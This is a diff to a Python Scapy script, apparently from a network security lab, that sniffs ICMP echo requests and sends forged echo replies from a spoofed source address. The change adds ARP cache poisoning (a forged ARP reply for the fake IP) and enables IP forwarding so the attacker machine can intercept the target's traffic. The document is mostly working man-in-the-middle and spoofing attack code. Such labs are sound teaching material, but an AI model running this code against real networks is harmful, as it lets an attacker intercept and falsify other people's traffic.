@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import ICMP, IP
-from scapy.layers.l2 import Ether
+from scapy.layers.l2 import Ether, ARP
 
 # Define the IP address of attacker machine
 attacker_ip = "10.9.0.1"
@@ -40,8 +40,7 @@ def sniff_and_spoof(pkt):
         # Drop the original packet by not forwarding it
 
         # Create a new packet with the spoofed source IP address
-        spoofed_pkt = IP(src=fake_ip, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / pkt[
-            Raw].load
+        spoofed_pkt = IP(src=fake_ip, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / pkt[Raw].load
         # Send the spoofed packet
         send(spoofed_pkt, verbose=False)
         print("Sent spoof")
@@ -50,12 +49,13 @@ def sniff_and_spoof(pkt):
 
 
 if __name__ == "__main__":
-    # Create a raw socket to intercept packets
-    sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+    # Enable IP forwarding
+    os.system("sysctl -w net.ipv4.ip_forward=1")
+
+    # Perform ARP spoofing to intercept packets
+    arp = ARP(op=2, psrc=fake_ip, pdst=target_ip)
+    send(arp, verbose=False)
 
     # Start sniffing and spoofing packets
     print("Start Sniffing...")
-    while True:
-        raw_packet, _ = sniffer.recvfrom(65535)
-        packet = Ether(raw_packet)
-        sniff_and_spoof(packet)
+    sniff(filter="icmp", prn=sniff_and_spoof)
